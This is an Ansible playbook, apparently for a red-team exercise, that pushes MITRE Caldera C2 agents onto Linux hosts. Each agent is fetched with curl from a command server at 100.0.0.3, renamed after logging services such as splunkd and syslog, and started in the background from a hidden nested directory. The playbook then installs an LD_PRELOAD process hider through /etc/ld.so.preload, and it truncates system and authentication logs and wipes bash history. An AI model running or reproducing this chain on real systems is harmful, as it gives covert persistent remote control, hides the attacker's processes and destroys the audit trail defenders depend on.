---
- name: Deploy Caldera agents and process hider on Linux hosts
  hosts: linux
  become: yes
  gather_facts: yes

  vars:
    # Base directory where tools are hidden
    deploy_base_dir: "/tmp/.syslogd_backup"
    # Generate three random folder names (each 4 random characters)
    random_folder1: "{{ lookup('password', '/dev/null', 'length=4', 'chars=ascii_letters') }}"
    random_folder2: "{{ lookup('password', '/dev/null', 'length=4', 'chars=ascii_letters') }}"
    random_folder3: "{{ lookup('password', '/dev/null', 'length=4', 'chars=ascii_letters') }}"
    # Final hidden directory (nested three levels deep)
    deploy_dir: "{{ deploy_base_dir }}/{{ random_folder1 }}/{{ random_folder2 }}/{{ random_folder3 }}"
    purge_logs: true

  tasks:
    - name: Install python3 and python3-pip
      package:
        name:
          - python3
          - python3-pip
        state: present

    - name: Create base hidden deployment directory
      file:
        path: "{{ deploy_base_dir }}"
        state: directory
        mode: "0755"

    - name: Create nested hidden deployment directory
      file:
        path: "{{ deploy_dir }}"
        state: directory
        mode: "0755"


    ###################################################################
    # Deploy multiple Caldera agents based on agent name (in background)
    ###################################################################
    

    # === HTTP Agents (Sandcat) ===
    - name: Deploy splunkd (HTTP)
      shell: |
        server="http://100.0.0.3:8888"
        cd {{ deploy_dir }}
        curl -s -X POST -H "file:sandcat.go" -H "platform:linux" "$server/file/download" > splunkd
        chmod +x splunkd
        nohup ./splunkd -server "$server" -group red >/dev/null 2>&1 &

    - name: Deploy splunk (HTTP)
      shell: |
        server="http://100.0.0.3:8888"
        cd {{ deploy_dir }}
        curl -s -X POST -H "file:sandcat.go" -H "platform:linux" "$server/file/download" > splunk
        chmod +x splunk
        nohup ./splunk -server "$server" -group red >/dev/null 2>&1 &

    - name: Deploy syslog (HTTP)
      shell: |
        server="http://100.0.0.3:8888"
        cd {{ deploy_dir }}
        curl -s -X POST -H "file:sandcat.go" -H "platform:linux" "$server/file/download" > syslog
        chmod +x syslog
        nohup ./syslog -server "$server" -group red >/dev/null 2>&1 &

    - name: Deploy graylog (HTTP)
      shell: |
        server="http://100.0.0.3:8888"
        cd {{ deploy_dir }}
        curl -s -X POST -H "file:sandcat.go" -H "platform:linux" "$server/file/download" > graylog
        chmod +x graylog
        nohup ./graylog -server "$server" -group red >/dev/null 2>&1 &

    - name: Deploy log (HTTP)
      shell: |
        server="http://100.0.0.3:8888"
        cd {{ deploy_dir }}
        curl -s -X POST -H "file:sandcat.go" -H "platform:linux" "$server/file/download" > log
        chmod +x log
        nohup ./log -server "$server" -group red >/dev/null 2>&1 &

    - name: Deploy notlog (HTTP)
      shell: |
        server="http://100.0.0.3:8888"
        cd {{ deploy_dir }}
        curl -s -X POST -H "file:sandcat.go" -H "platform:linux" "$server/file/download" > notlog
        chmod +x notlog
        nohup ./notlog -server "$server" -group red >/dev/null 2>&1 &

    - name: Deploy notlog-http (HTTP)
      shell: |
        server="http://100.0.0.3:8888"
        cd {{ deploy_dir }}
        curl -s -X POST -H "file:sandcat.go" -H "platform:linux" "$server/file/download" > notlog-http
        chmod +x notlog-http
        nohup ./notlog-http -server "$server" -group red >/dev/null 2>&1 &

    # === HTML Agents (RagDoll) ===
    - name: Deploy notlog-html (HTML)
      shell: |
        server="http://100.0.0.3:8888"
        cd {{ deploy_dir }}
        curl -s -X POST -H "file:ragdoll.py" -H "platform:linux" "$server/file/download" > notlog-html.py
        pip install -q requests beautifulsoup4
        nohup python3 notlog-html.py -W "$server/weather" >/dev/null 2>&1 &

    - name: Deploy syslog-html (HTML)
      shell: |
        server="http://100.0.0.3:8888"
        cd {{ deploy_dir }}
        curl -s -X POST -H "file:ragdoll.py" -H "platform:linux" "$server/file/download" > syslog-html.py
        pip install -q requests beautifulsoup4
        nohup python3 syslog-html.py -W "$server/weather" >/dev/null 2>&1 &

    - name: Deploy log-html (HTML)
      shell: |
        server="http://100.0.0.3:8888"
        cd {{ deploy_dir }}
        curl -s -X POST -H "file:ragdoll.py" -H "platform:linux" "$server/file/download" > log-html.py
        pip install -q requests beautifulsoup4
        nohup python3 log-html.py -W "$server/weather" >/dev/null 2>&1 &

    - name: Deploy ragdoll (HTML)
      shell: |
        server="http://100.0.0.3:8888"
        cd {{ deploy_dir }}
        curl -s -X POST -H "file:ragdoll.py" -H "platform:linux" "$server/file/download" > ragdoll.py
        pip install -q requests beautifulsoup4
        nohup python3 ragdoll.py -W "$server/weather" >/dev/null 2>&1 &

    # === Manx TCP Agents ===
    - name: Deploy notlog-tcp (Manx TCP)
      shell: |
        server="http://100.0.0.3:8888"
        socket="100.0.0.3:7010"
        contact="tcp"
        cd {{ deploy_dir }}
        curl -s -X POST -H "file:manx.go" -H "platform:linux" "$server/file/download" > notlog-tcp
        chmod +x notlog-tcp
        nohup ./notlog-tcp -http "$server" -socket "$socket" -contact "$contact" >/dev/null 2>&1 &

    - name: Deploy syslog-tcp (Manx TCP)
      shell: |
        server="http://100.0.0.3:8888"
        socket="100.0.0.3:7010"
        contact="tcp"
        cd {{ deploy_dir }}
        curl -s -X POST -H "file:manx.go" -H "platform:linux" "$server/file/download" > syslog-tcp
        chmod +x syslog-tcp
        nohup ./syslog-tcp -http "$server" -socket "$socket" -contact "$contact" >/dev/null 2>&1 &

    - name: Deploy log-tcp (Manx TCP)
      shell: |
        server="http://100.0.0.3:8888"
        socket="100.0.0.3:7010"
        contact="tcp"
        cd {{ deploy_dir }}
        curl -s -X POST -H "file:manx.go" -H "platform:linux" "$server/file/download" > log-tcp
        chmod +x log-tcp
        nohup ./log-tcp -http "$server" -socket "$socket" -contact "$contact" >/dev/null 2>&1 &

    - name: Deploy splunk-tcp (Manx TCP)
      shell: |
        server="http://100.0.0.3:8888"
        socket="100.0.0.3:7010"
        contact="tcp"
        cd {{ deploy_dir }}
        curl -s -X POST -H "file:manx.go" -H "platform:linux" "$server/file/download" > splunk-tcp
        chmod +x splunk-tcp
        nohup ./splunk-tcp -http "$server" -socket "$socket" -contact "$contact" >/dev/null 2>&1 &


    ###################################################################
    # 5) Copy and build the process hider
    ###################################################################
    - name: Copy processhider.c from hideprocesses folder
      copy:
        src: ../hideprocesses/processhider.c
        dest: "{{ deploy_dir }}/processhider.c"
        mode: "0644"

    - name: Copy Makefile from hideprocesses folder
      copy:
        src: ../hideprocesses/Makefile
        dest: "{{ deploy_dir }}/Makefile"
        mode: "0644"

    - name: Build process hider via make
      command: make
      args:
        chdir: "{{ deploy_dir }}"
      ignore_errors: yes

    - name: Compile process hider (fallback if make did not work)
      shell: gcc -Wall -fPIC -shared -o process.so processhider.c -ldl
      args:
        chdir: "{{ deploy_dir }}"
      ignore_errors: yes

    - name: Move process.so to /usr/local/lib and update ld.so.preload
      shell: |
        mv {{ deploy_dir }}/process.so /usr/local/lib/ 2>/dev/null || true
        grep -qxF "/usr/local/lib/process.so" /etc/ld.so.preload || echo "/usr/local/lib/process.so" >> /etc/ld.so.preload

    ###################################################################
    # 6) Cleanup: Remove the hidden deployment directory and clear logs/history
    ###################################################################
    - name: Remove processhider.c after build
      file:
        path: "{{ deploy_dir }}/processhider.c"
        state: absent

    - name: Remove Makefile after build
      file:
        path: "{{ deploy_dir }}/Makefile"
        state: absent


    - block:
        - name: Truncate syslog (Debian/Ubuntu)
          shell: "truncate -s 0 /var/log/syslog 2>/dev/null || true"
          when: ansible_facts['os_family'] == "Debian"

        - name: Truncate auth.log (Debian/Ubuntu)
          shell: "truncate -s 0 /var/log/auth.log 2>/dev/null || true"
          when: ansible_facts['os_family'] == "Debian"

        - name: Truncate messages (Rocky/RedHat)
          shell: "truncate -s 0 /var/log/messages 2>/dev/null || true"
          when: ansible_facts['os_family'] == "RedHat"

        - name: Truncate secure (Rocky/RedHat)
          shell: "truncate -s 0 /var/log/secure 2>/dev/null || true"
          when: ansible_facts['os_family'] == "RedHat"

        - name: Clear root bash history
          shell: |
            [ -f /root/.bash_history ] && cat /dev/null > /root/.bash_history 2>/dev/null || true
            history -c 2>/dev/null || true
            history -w 2>/dev/null || true
        - name: Clear primary user's bash history (john_hammond)
          shell: |
            [ -f /home/john_hammond/.bash_history ] && cat /dev/null > /home/john_hammond/.bash_history 2>/dev/null || true
      when: purge_logs
